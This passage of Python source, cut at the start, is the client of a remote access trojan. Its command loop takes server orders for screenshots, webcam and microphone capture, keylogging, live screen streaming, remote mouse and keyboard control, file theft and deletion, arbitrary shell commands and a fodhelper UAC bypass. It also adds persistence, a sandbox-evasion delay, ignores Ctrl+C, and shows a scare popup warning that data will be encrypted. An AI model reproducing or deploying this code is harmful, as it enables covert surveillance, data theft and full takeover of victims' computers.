    outer_glow = tk.Frame(root, bg="#FF003C")
    outer_glow.pack(fill="both", expand=True, padx=6, pady=6)

    inner = tk.Frame(outer_glow, bg="#0A0A0A")
    inner.pack(fill="both", expand=True, padx=2, pady=2)

    warn_bar = tk.Frame(inner, bg="#FF003C", height=8)
    warn_bar.pack(fill="x")
    warn_bar.pack_propagate(False)

    alert_label = tk.Label(inner, text="⚠️ SYSTEM OVERRIDE ⚠️",
                           font=("Consolas", 36, "bold"), bg="#0A0A0A", fg="#FF003C")
    alert_label.pack(pady=(50, 10))

    def blink_alert():
        try:
            current_fg = alert_label.cget("fg")
            next_fg = "#0A0A0A" if current_fg == "#FF003C" else "#FF003C"
            alert_label.config(fg=next_fg)
            root.after(300, blink_alert)
        except: pass
    blink_alert()

    tk.Label(inner, text=title, font=("Consolas", 42, "bold"),
             bg="#0A0A0A", fg="white", wraplength=sw-100).pack(pady=(20, 15))

    msg_label = tk.Label(inner, text=message, font=("Consolas", 24),
                         bg="#0A0A0A", fg="#00FF41", wraplength=sw-100,
                         justify="center")
    msg_label.pack(pady=15, expand=True)

    tk.Label(inner, text="DO NOT IGNORE — CRITICAL SYSTEM ALERT",
             font=("Consolas", 14, "bold"), bg="#0A0A0A", fg="#FF003C").pack(pady=(10, 5))

    is_open = [True]
    click_count = [0]

    def ambulance_siren_loop():
        if platform.system() != "Windows": return
        try:
            import winsound
            while is_open[0]:
                if not is_open[0]: break
                winsound.Beep(700, 400)
                if not is_open[0]: break
                winsound.Beep(900, 400)
        except: pass

    def scary_voice_loop():
        if platform.system() != "Windows": return
        try:
            import subprocess
            msg_text = "Warning. System compromised. Unauthorized access detected. All data will be encrypted."
            ps_cmd = (
                'powershell -Command "Add-Type -AssemblyName System.Speech; '
                '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
                '$synth.Rate = -3; '
                f'$synth.Speak(\'{msg_text}\')"'
            )
            while is_open[0]:
                subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
        except: pass

    threading.Thread(target=ambulance_siren_loop, daemon=True).start()
    threading.Thread(target=scary_voice_loop, daemon=True).start()

    def on_enter(e): btn.config(bg="#FF003C", fg="white")
    def on_leave(e): btn.config(bg="#1A1A2D", fg="#FF003C")

    def close_popup():
        click_count[0] += 1
        if click_count[0] >= 3:
            is_open[0] = False
            root.destroy()
        else:
            btn.config(text=f"[ ACKNOWLEDGE ({3-click_count[0]}) ]")

    btn = tk.Button(inner, text="[ ACKNOWLEDGE (3) ]", command=close_popup,
                    font=("Consolas", 18, "bold"), bg="#1A1A2D", fg="#FF003C",
                    relief="flat", activebackground="#FF003C", activeforeground="white",
                    padx=40, pady=15)
    btn.pack(pady=40)
    btn.bind("<Enter>", on_enter)
    btn.bind("<Leave>", on_leave)

    def fade_in(alpha=0.0):
        try:
            alpha += 0.05
            if alpha <= 1.0:
                root.attributes('-alpha', alpha)
                root.after(30, fade_in, alpha)
        except: pass
    root.after(100, fade_in)

    def force_focus():
        try:
            root.lift()
            root.attributes('-topmost', True)
            root.focus_force()
            root.after(500, force_focus)
        except: pass
    force_focus()

    root.mainloop()


def show_selected_popup(style, title, message):
    """Show the selected popup style with a safe OS-level fallback if Tkinter fails."""
    try:
        if style in ("INFO", "WARNING", "ERROR"):
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            root.attributes("-topmost", True)
            if style == "INFO":
                messagebox.showinfo(title, message, parent=root)
            elif style == "WARNING":
                messagebox.showwarning(title, message, parent=root)
            elif style == "ERROR":
                messagebox.showerror(title, message, parent=root)
            root.destroy()
        elif style == "CYBER":
            show_cyber_popup(title, message)
        elif style == "OVERRIDE":
            show_override_popup(title, message)
        else:
            show_cyber_popup(title, message)

    except Exception:
        # Fallback to OS Messagebox
        try:
            import ctypes
            icon_map = {"INFO": 0x40, "WARNING": 0x30, "ERROR": 0x10, "CYBER": 0x40, "OVERRIDE": 0x10}
            icon = icon_map.get(style, 0x40)
            ctypes.windll.user32.MessageBoxW(0, message, title, icon | 0x40000 | 0x10000)
        except Exception:
            print(f"Fallback Print Alert [{style}] - {title}: {message}")


def main_loop():
    """Main client loop with auto-reconnect - disabled for screenshot failures"""
    global client, current_dir
    time.sleep(18)  # Sandbox evasion: delay before connecting
    _add_persistence()
    screenshot_in_progress = False
    
    while True:
        try:
            client = connect_server()
            current_dir = os.getcwd()
            screenshot_in_progress = False
            
            while True:
                try:
                    data = client.recv(65536)
                    
                    if not data:
                        print("⚠️ Server closed connection")
                        # If screenshot was in progress, don't auto-reconnect
                        if screenshot_in_progress:
                            print("❌ Screenshot failed - connection lost. Exiting...")
                            return
                        break
                    
                    cmd = data.decode(errors='ignore').strip()

                    if cmd.lower() == "exit":
                        print("✓ Exit command received")
                        client.close()
                        return
                    
                    elif cmd.lower() == "shutdown_client":
                        print("✓ Server requested client shutdown")
                        client.close()
                        print("🔴 Client terminated by server")
                        threading.Timer(3.0, os._exit, [0]).start()
                        sys.exit(0)

                    # Special commands
                    if cmd.startswith("POPUP:"):
                        # Show popup message on client screen
                        try:
                            parts = cmd.split(":", 3)
                            
                            # Parse format: POPUP:<style>:<title>:<message> or POPUP:<title>:<message>
                            possible_style = parts[1].upper() if len(parts) > 1 else "CYBER"
                            if possible_style in ("CYBER", "INFO", "WARNING", "ERROR", "OVERRIDE"):
                                style = possible_style
                                title = parts[2] if len(parts) > 2 else "Alert"
                                message = parts[3] if len(parts) > 3 else ""
                            else:
                                # Backward compatibility: parse as POPUP:title:message
                                style = "CYBER"  # Default style
                                title = parts[1] if len(parts) > 1 else "Alert"
                                message = parts[2] if len(parts) > 2 else ""

                            # Spawn popup in a separate subprocess to prevent Tkinter thread-safety crashes (Tcl_AsyncDelete)
                            if getattr(sys, 'frozen', False):
                                cmd_args = [sys.executable, "--popup", style, title, message]
                            else:
                                cmd_args = [sys.executable, os.path.abspath(sys.argv[0]), "--popup", style, title, message]
                            
                            # Hide console window of the spawned python subprocess on Windows
                            creation_flags = 0x08000000 if platform.system() == "Windows" else 0
                            subprocess.Popen(cmd_args, creationflags=creation_flags)
                            
                            output = json.dumps({"type": "POPUP", "status": "success", "message": f"Popup alert ({style}) shown successfully"}).encode()
                        except Exception as e:
                            output = json.dumps({"type": "POPUP", "status": "error", "message": str(e)}).encode()
                    
                    elif cmd == "SCREENSHOT":
                        screenshot_in_progress = True
                        output = take_screenshot().encode()
                        screenshot_in_progress = False
                    
                    elif cmd == "WEBCAM":
                        output = capture_webcam().encode()
                    
                    elif cmd == "MICROPHONE" or cmd.startswith("MICROPHONE:"):
                        try:
                            duration = 10
                            if cmd.startswith("MICROPHONE:"):
                                duration = int(cmd.split(":", 1)[1].strip())
                            output = capture_audio(duration).encode()
                        except Exception as e:
                            output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()

                    elif cmd == "MIC_START":
                        try:
                            start_mic_stream()
                        except Exception as e:
                            output = json.dumps({"type": "MICROPHONE", "status": "error", "message": f"Failed to start microphone stream: {str(e)}"}).encode()
                            with client_lock:
                                client.send(output)
                        continue

                    elif cmd == "MIC_STOP":
                        try:
                            output = stop_mic_stream().encode()
                        except Exception as e:
                            output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()
                    
                    elif cmd == "KEYLOG_START":
                        try:
                            start_keylog_stream()
                        except Exception as e:
                            output = json.dumps({"type": "KEYLOG", "status": "error", "message": f"Failed to start keylog stream: {str(e)}"}).encode()
                            with client_lock:
                                client.send(output)
                        continue

                    elif cmd == "KEYLOG_STOP":
                        stop_keylog_stream()
                        continue

                    elif cmd == "LIVE_SCREEN":
                        try:
                            start_screen_stream()
                        except Exception as e:
                            output = json.dumps({"type": "LIVE_SCREEN", "status": "error", "message": f"Failed to start screen stream: {str(e)}"}).encode()
                            with client_lock:
                                client.send(output)
                        continue

                    elif cmd == "LIVE_SCREEN_STOP":
                        stop_screen_stream()
                        continue

                    elif cmd.startswith(("MOUSE_CLICK:", "MOUSE_MOVE:", "MOUSE_PRESS:",
                                         "MOUSE_RELEASE:", "MOUSE_DRAG:", "MOUSE_SCROLL:",
                                         "KEY_PRESS:")):
                        try:
                            from pynput.mouse import Button, Controller as MouseController
                            from pynput.keyboard import Key, Controller as KeyboardController

                            if cmd.startswith("MOUSE_CLICK:"):
                                parts = cmd.split(":")
                                x, y, btn_type = int(parts[1]), int(parts[2]), parts[3]
                                m = MouseController()
                                m.position = (x, y)
                                time.sleep(0.05)
                                if btn_type == "right":
                                    m.click(Button.right, 1)
                                elif btn_type == "double":
                                    m.click(Button.left, 2)
                                else:
                                    m.click(Button.left, 1)

                            elif cmd.startswith("MOUSE_PRESS:"):
                                parts = cmd.split(":")
                                x, y = int(parts[1]), int(parts[2])
                                m = MouseController()
                                m.position = (x, y)
                                m.press(Button.left)

                            elif cmd.startswith("MOUSE_RELEASE:"):
                                parts = cmd.split(":")
                                x, y = int(parts[1]), int(parts[2])
                                m = MouseController()
                                m.position = (x, y)
                                m.release(Button.left)

                            elif cmd.startswith("MOUSE_DRAG:"):
                                parts = cmd.split(":")
                                x, y = int(parts[1]), int(parts[2])
                                m = MouseController()
                                m.position = (x, y)

                            elif cmd.startswith("MOUSE_MOVE:"):
                                parts = cmd.split(":")
                                x, y = int(parts[1]), int(parts[2])
                                m = MouseController()
                                m.position = (x, y)

                            elif cmd.startswith("MOUSE_SCROLL:"):
                                delta = int(cmd.split(":")[1])
                                m = MouseController()
                                m.scroll(0, delta)

                            elif cmd.startswith("KEY_PRESS:"):
                                key_name = cmd.split(":", 1)[1]
                                k = KeyboardController()
                                if key_name.startswith("ctrl+"):
                                    # Ctrl+key hotkey (e.g. ctrl+c, ctrl+v, ctrl+z)
                                    actual = key_name.split("+", 1)[1]
                                    with k.pressed(Key.ctrl):
                                        k.press(actual)
                                        k.release(actual)
                                elif key_name.startswith("Key."):
                                    attr = key_name.split(".")[1]
                                    key_obj = getattr(Key, attr, None)
                                    if key_obj:
                                        k.press(key_obj)
                                        k.release(key_obj)
                                else:
                                    k.press(key_name)
                                    k.release(key_name)

                        except Exception:
                            pass
                        continue
                    
                    elif cmd.startswith("DOWNLOAD:"):
                        filepath = cmd.split(":", 1)[1].strip()
                        output = download_file(filepath).encode()
                    
                    elif cmd.startswith("UPLOAD:"):
                        try:
                            # Split base64 data from the right to handle paths with colons
                            cmd_str = cmd
                            data_b64 = cmd_str.split(":")[-1]
                            # Path is everything between UPLOAD: and the last colon
                            filename = cmd_str[7:-(len(data_b64)+1)].strip()
                            output = upload_file(filename, data_b64).encode()
                        except Exception as e:
                            output = json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)}).encode()
                    
                    elif cmd == "SYSINFO":
                        info = {
                            "type": "SYSINFO",
                            "hostname": platform.node(),
                            "os": f"{platform.system()} {platform.release()}",
                            "architecture": platform.machine(),
                            "processor": platform.processor(),
                            "user": os.getlogin(),
                            "current_dir": os.getcwd()
                        }
                        output = json.dumps(info, indent=2).encode()

                    elif cmd == "PROCESS_LIST":
                        output = get_process_list().encode()

                    elif cmd == "SYSTEM_METRICS":
                        output = get_system_metrics().encode()

                    elif cmd == "PRIV_INFO":
                        output = get_privilege_info().encode()

                    elif cmd == "UAC_BYPASS":
                        output = uac_bypass_fodhelper().encode()

                    elif cmd.startswith("FILE_BROWSER:"):
                        target_path = cmd.split(":", 1)[1].strip()
                        output = list_directory_contents(target_path).encode()

                    elif cmd.startswith("DELETE_FILE:"):
                        target_path = cmd.split(":", 1)[1].strip()
                        output = delete_remote_file(target_path).encode()

                    elif cmd.startswith("READ_TEXT_FILE:"):
                        target_path = cmd.split(":", 1)[1].strip()
                        output = read_text_file(target_path).encode()

                    elif cmd.startswith("WRITE_TEXT_FILE:"):
                        try:
                            payload = cmd.split(":", 1)[1].strip()
                            parts = payload.rsplit("|", 2)
                            target_path = parts[0].strip()
                            encoding = parts[1].strip()
                            content_b64 = parts[2]
                            output = write_text_file(target_path, encoding, content_b64).encode()
                        except Exception as e:
                            output = json.dumps({"type": "WRITE_TEXT_FILE", "status": "error", "message": f"Malformed command: {str(e)}"}).encode()
                    
                    elif cmd.strip().startswith("cd"):
                        path = cmd.strip()[2:].strip()
                        try:
                            if path == "":
                                output = f"Directory: {current_dir}".encode()
                            elif path == "..":
                                os.chdir("..")
                                current_dir = os.getcwd()
                                output = f"Directory: {current_dir}".encode()
                            else:
                                os.chdir(path)
                                current_dir = os.getcwd()
                                output = f"Directory: {current_dir}".encode()
                        except Exception as e:
                            output = f"Error: {str(e)}".encode()
                    
                    elif cmd == "NETWORK_INFO":
                        cmd = get_command("network_info")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "LIST_FILES":
                        cmd = get_command("list_files")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "PROCESSES":
                        cmd = get_command("list_processes")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "SYSTEM_INFO":
                        cmd = get_command("system_info")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "RESTART":
                        cmd = get_command("restart")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Restart command sent"
                    
                    elif cmd == "SHUTDOWN":
                        cmd = get_command("shutdown")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Shutdown command sent"
                    
                    elif cmd == "LOCK":
                        cmd = get_command("lock")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Lock command sent"
                    
                    elif cmd.startswith("FIND_PROCESS:"):
                        name = cmd.split(":", 1)[1].strip()
                        cmd_str = get_command("find_process") + " " + name
                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd.startswith("KILL_PROCESS:"):
                        target = cmd.split(":", 1)[1].strip()
                        if target.isdigit():
                            output = kill_process_by_pid(target).encode()
                        else:
                            cmd_str = get_command("kill_process") + " " + target
                            result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                            output = result.stdout if result.stdout else result.stderr
                    
                    else:
                        # Command aliases for cross-platform compatibility
                        cmd_stripped = cmd.strip()
                        cmd_lower = cmd_stripped.lower()
                        
                        # Handle common Linux commands that might be typed
                        if cmd_lower == "ls- la" or cmd_lower == "ls-la":
                            cmd = "ls -la"
                        elif cmd_lower == "ls-la":
                            cmd = "ls -la"
                        elif cmd_lower == "ll":
                            cmd = "ls -la"
                        elif cmd_lower == "la":
                            cmd = "ls -la"
                        elif cmd_lower == "l":
                            cmd = "ls -la"
                        elif cmd_lower == "tree":
                            cmd = "tree"  # Keep tree as is
                        elif cmd_lower == "df":
                            cmd = "df -h"  # Disk free with human readable
                        elif cmd_lower == "du":
                            cmd = "du -sh"  # Disk usage summary
                        elif cmd_lower == "free":
                            cmd = "free -h"  # Memory with human readable
                        elif cmd_lower == "top":
                            cmd = "top"  # Process monitor
                        elif cmd_lower == "htop":
                            cmd = "htop"  # Better process monitor
                        elif cmd_lower == "nano":
                            cmd = "nano"  # Text editor
                        elif cmd_lower == "vi":
                            cmd = "vi"  # Text editor
                        elif cmd_lower == "vim":
                            cmd = "vim"  # Text editor
                        elif cmd_lower == "grep":
                            cmd = "grep"  # Keep grep as is
                        elif cmd_lower == "find":
                            cmd = "find"  # Keep find as is
                        elif cmd_lower == "chmod":
                            cmd = "chmod"  # Keep chmod as is
                        elif cmd_lower == "chown":
                            cmd = "chown"  # Keep chown as is
                        
                        # Handle sudo commands on Linux
                        if os_name == "Linux" and cmd_lower.startswith("sudo "):
                            # Remove sudo prefix and run command directly with shell=True
                            cmd = cmd[5:]  # Remove 'sudo ' prefix
                        
                        # Linux/Windows command mapping
                        if os_name == "Windows":
                            if cmd_lower == "ls":
                                cmd = "dir"
                            elif cmd_lower.startswith("ls "):
                                cmd = "dir" + cmd[2:]
                            elif cmd_lower == "pwd":
                                cmd = "cd"
                            elif cmd_lower == "clear":
                                cmd = "cls"
                            elif cmd_lower.startswith("cat "):
                                cmd = "type" + cmd[3:]
                            elif cmd_lower.startswith("rm "):
                                cmd = "del" + cmd[2:]
                            elif cmd_lower.startswith("mv "):
                                cmd = "move" + cmd[2:]
                            elif cmd_lower.startswith("cp "):
                                cmd = "copy" + cmd[2:]
                            elif cmd_lower.startswith("rmdir "):
                                cmd = "rmdir " + cmd[5:]
                            elif cmd_lower.startswith("mkdir "):
                                cmd = "md " + cmd[5:]  # Linux mkdir to Windows md
                            elif cmd_lower == "tree":
                                cmd = "tree"  # Windows tree command
                            elif cmd_lower == "grep":
                                cmd = "findstr"  # Linux grep to Windows findstr
                            elif cmd_lower.startswith("grep "):
                                cmd = "findstr " + cmd[4:]  # Linux grep to Windows findstr
                            elif cmd_lower == "ps":
                                cmd = "tasklist"  # Linux ps to Windows tasklist
                            elif cmd_lower == "kill":
                                cmd = "taskkill"  # Linux kill to Windows taskkill
                            elif cmd_lower.startswith("kill "):
                                cmd = "taskkill /F /IM " + cmd[4:]  # Linux kill to Windows taskkill
                            elif cmd_lower == "df":
                                cmd = "wmic logicaldisk get size,freespace,caption"  # Disk info
                            elif cmd_lower == "du":
                                cmd = "dir /s"  # Directory size
                            elif cmd_lower == "free":
                                cmd = "wmic OS get TotalVisibleMemorySize,FreePhysicalMemory"  # Memory info
                            elif cmd_lower == "top":
                                cmd = "tasklist"  # Process list
                            elif cmd_lower == "nano" or cmd_lower == "vi" or cmd_lower == "vim":
                                cmd = "notepad"  # Text editors to notepad
                            elif cmd_lower.startswith("chmod "):
                                cmd = "icacls " + cmd[5:]  # Linux chmod to Windows icacls
                            elif cmd_lower == "ifconfig":
                                cmd = "ipconfig"  # Keep ifconfig as ipconfig on Windows
                        else:
                            if cmd_lower == "cls":
                                cmd = "clear"
                            elif cmd_lower == "dir":
                                cmd = "ls"
                            elif cmd_lower == "ipconfig":
                                cmd = "ip addr"
                            elif cmd_lower == "ifconfig":
                                cmd = "ip addr"
                            elif cmd_lower == "tasklist":
                                cmd = "ps aux"
                            elif cmd_lower == "tasklist /svc":  # Windows style
                                cmd = "ps aux"
                            elif cmd_lower == "systeminfo":
                                cmd = "uname -a"
                            elif cmd_lower == "ver":
                                cmd = "uname -a"
                            elif cmd_lower == "chdir":
                                cmd = "cd"
                            elif cmd_lower.startswith("del "):
                                cmd = "rm " + cmd[3:]  # Windows del to Linux rm
                            elif cmd_lower.startswith("rmdir "):
                                cmd = "rmdir " + cmd[5:]
                            elif cmd_lower.startswith("md "):  # Windows md
                                cmd = "mkdir " + cmd[2:]
                            elif cmd_lower.startswith("move "):
                                cmd = "mv " + cmd[4:]
                            elif cmd_lower.startswith("copy "):
                                cmd = "cp " + cmd[4:]
                            elif cmd_lower.startswith("type "):
                                cmd = "cat " + cmd[4:]
                            elif cmd_lower == "tree":
                                cmd = "tree"  # Keep tree as is
                            elif cmd_lower == "findstr":
                                cmd = "grep"  # Windows findstr to Linux grep
                            elif cmd_lower.startswith("findstr "):
                                cmd = "grep " + cmd[7:]  # Windows findstr to Linux grep
                            elif cmd_lower == "notepad":
                                cmd = "nano"  # Windows notepad to Linux nano
                            elif cmd_lower.startswith("notepad "):
                                cmd = "nano " + cmd[7:]  # Windows notepad to Linux nano
                            elif cmd_lower == "taskkill":
                                cmd = "kill"  # Windows taskkill to Linux kill
                            elif cmd_lower.startswith("taskkill "):
                                cmd = "kill " + cmd[8:]  # Windows taskkill to Linux kill
                            elif cmd_lower == "wmic":
                                cmd = "dmidecode"  # Windows wmic to Linux dmidecode
                            elif cmd_lower.startswith("wmic "):
                                cmd = "dmidecode " + cmd[4:]  # Windows wmic to Linux dmidecode
                        
                        # Regular command
                        try:
                            result = subprocess.run(
                                cmd,
                                shell=True,
                                capture_output=True,
                                text=False,
                                cwd=current_dir,
                                timeout=5
                            )
                            
                            if result.returncode == 0:
                                if result.stdout and len(result.stdout.strip()) > 0:
                                    output = result.stdout
                                else:
                                    output = f"✓ Command executed successfully".encode()
                            else:
                                if result.stderr and len(result.stderr.strip()) > 0:
                                    # Check for permission denied and provide helpful message
                                    stderr_text = result.stderr.decode(errors='ignore')
                                    if "Permission denied" in stderr_text:
                                        if os_name == "Linux":
                                            output = f"❌ Permission denied. Try 'sudo {cmd}' or check directory permissions".encode()
                                        else:
                                            output = f"❌ Permission denied. Run as Administrator or check directory permissions".encode()
                                    else:
                                        output = result.stderr
                                else:
                                    output = f"Command failed with code {result.returncode}".encode()
                                
                        except subprocess.TimeoutExpired:
                            output = "⚠️ Command timeout (5 seconds)".encode()
                        except Exception as e:
                            error_msg = str(e)
                            # Handle common shell errors
                            if "not found" in error_msg.lower():
                                output = f"❌ Command not found: {cmd}".encode()
                            elif "permission denied" in error_msg.lower():
                                output = f"❌ Permission denied: {cmd}".encode()
                            else:
                                output = error_msg.encode()

                    with client_lock:
                        client.send(output)
                    
                    if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:",
                                                   "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE",
                                                   "KEYLOG_START", "KEYLOG_STOP", "MIC_STOP",
                                                   "PROCESS_LIST", "SYSTEM_METRICS", "KILL_PROCESS:",
                                                   "FILE_BROWSER:", "DELETE_FILE:", "READ_TEXT_FILE:",
                                                   "WRITE_TEXT_FILE:", "LIVE_SCREEN", "LIVE_SCREEN_STOP",
                                                   "MOUSE_CLICK:", "MOUSE_PRESS:", "MOUSE_RELEASE:",
                                                   "MOUSE_DRAG:", "MOUSE_MOVE:", "MOUSE_SCROLL:",
                                                   "KEY_PRESS:", "PRIV_INFO", "UAC_BYPASS")):

                        try:
                            time.sleep(0.1)
                            with client_lock:
                                client.send(b"\n}")
                        except:
                            pass

                except ConnectionResetError:
                    print("⚠️ Server disconnected")
                    break  # Exit inner loop, will reconnect
                except ConnectionAbortedError:
                    print("⚠️ Server closed connection")
                    break  # Exit inner loop, will reconnect
                except Exception as e:
                    print(f"⚠️ Connection error: {e}")
                    break  # Exit inner loop, will reconnect
            
            # Connection lost, close and retry
            try:
                client.close()
            except:
                pass
            print("🔄 Reconnecting in 5 seconds...")
            time.sleep(5)
            
        except KeyboardInterrupt:
            print("\n⚠️ Client cannot be stopped manually. Waiting for server to disconnect...")
            continue  # Keep running, don't exit
        except Exception as e:
            print(f"⚠️ Error: {e}")
            print("🔄 Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--popup":
        style = sys.argv[2] if len(sys.argv) > 2 else "CYBER"
        title = sys.argv[3] if len(sys.argv) > 3 else "Alert"
        message = sys.argv[4] if len(sys.argv) > 4 else ""
        show_selected_popup(style, title, message)
        sys.exit(0)
        
    main_loop()
